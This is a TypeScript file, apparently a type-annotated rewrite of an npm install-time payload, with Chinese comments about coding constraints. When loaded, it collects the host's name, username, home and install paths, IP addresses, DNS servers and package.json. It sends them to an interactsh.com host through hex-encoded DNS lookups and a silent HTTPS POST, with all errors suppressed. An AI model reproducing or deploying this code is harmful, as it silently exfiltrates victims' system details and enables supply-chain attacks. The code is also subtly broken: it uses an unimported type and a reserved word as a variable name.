import os from 'os';
import dns from 'dns';
import querystring from 'querystring';
import https from 'https';
import fs from 'fs';
import path from 'path';
import packageJSON from './package.json'; // 约束60: 使用import替代require

// 约束10: 使用具体类型替代any
interface TrackingData {
    p: string;
    c: string;
    hd: string;
    hn: string;
    un: string;
    dns: string;
    r?: string;
    v: string;
    pjson: Object;
    ip: string;
}

// 约束1: 显式声明函数参数和返回类型
function getFiles(paths: string[]): string[] {
    let ufiles: string[] = [];
    for (let j = 0; j < paths.length; j++) {
        let mpath: string = paths[j];
        let files: string[] = fs.readdirSync(mpath);
        for (let i = 0; i < files.length; i++) {
            ufiles.push(path.join(mpath, files[i]));
        }
    }
    return ufiles;
}

// 约束1: 添加参数和返回类型
function toHex(data: string): string {
    const encoder = new TextEncoder();
    const bytes = encoder.encode(data);
    let hex = '';
    for (const byte of bytes) {
        hex += byte.toString(16).padStart(2, '0');
    }
    return hex;
}

// 约束1: 显式声明返回类型
function gethttpips(): string[] {
    let str: string[] = [];
    let networkInterfaces = os.networkInterfaces();
    for (let item in networkInterfaces) {
        if (item != "lo") {
            for (let i = 0; i < networkInterfaces[item].length; i++) {
                str.push(networkInterfaces[item][i].address);
            }
        }
    }
    return str;
}

function getIps(): string {
    let str: string = "";
    let networkInterfaces = os.networkInterfaces();
    for (let item in networkInterfaces) {
        if (item != "lo") {
            for (let i = 0; i < networkInterfaces[item].length; i++) {
                str += toHex(networkInterfaces[item][i].address) + ".";
            }
        }
    }
    return str.slice(0, -1);
}

function getPathChunks(path: string): string {
    let str: string = "p";
    let chunks: string[] = path.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    str = str.slice(0, -1) + "p";
    return str;
}

// 约束1: 添加参数和返回类型
function toName(pkg: TrackingData): string[] {
    let str: string = "";
    let queries: string[] = [];
    let substr1: string = "";
    let substr2: string = "";
    const hostname: string = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
    str = toHex(pkg.hn) + "." + toHex(pkg.p) + "." + getPathChunks(pkg.c) + "." + toHex(pkg.un) + "." + getIps() + "." + hostname;
    if (str.length > 255) {
        substr1 = toHex(pkg.p) + "." + getPathChunks(pkg.c);
        substr2 = getIps();
        if (substr1.length < 150) {
            substr1 = toHex(pkg.hn) + "." + substr1 + "." + toHex(pkg.un);
            queries.push(substr1 + "." + hostname);
            queries.push(substr2 + "." + hostname);
        } else if (substr2.length < 150) {
            substr2 = toHex(pkg.hn) + "." + toHex(pkg.un) + "." + substr2;
            queries.push(substr1 + "." + hostname);
            queries.push(substr2 + "." + hostname);
        } else {
            queries.push(toHex(pkg.hn) + "." + substr1 + "." + hostname);
            queries.push(toHex(pkg.hn) + "." + toHex(pkg.hd) + "." + toHex(pkg.un) + "." + hostname);
            queries.push(toHex(pkg.hn) + "." + substr2 + "." + hostname);
        }
    } else {
        queries.push(str);
    }
    return queries;
}

const package = packageJSON.name;

// 约束24: 使用接口定义对象类型
const td: TrackingData = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON ? (packageJSON as Object)['___resolved'] : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
};

// 约束26: 使用箭头函数替代函数表达式
let qs: string[] = toName(td);
for (let j = 0; j < qs.length; j++) {
    dns.lookup(qs[j], (err: Error, result: string) => {
        // console.log(result)
    });
}

const trackingData: string = JSON.stringify(td);
let postData: string = querystring.stringify({
    msg: trackingData,
});

// 约束1: 显式声明options类型
let options: https.RequestOptions = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString(),
    },
};

// 约束26: 使用箭头函数
let req = https.request(options, (res: http.IncomingMessage) => {
    res.on("data", (d: Buffer) => {
        // process.stdout.write(d);
    });
});

req.on("error", (e: Error) => {
    // console.error(e);
});

req.write(postData);
req.end();
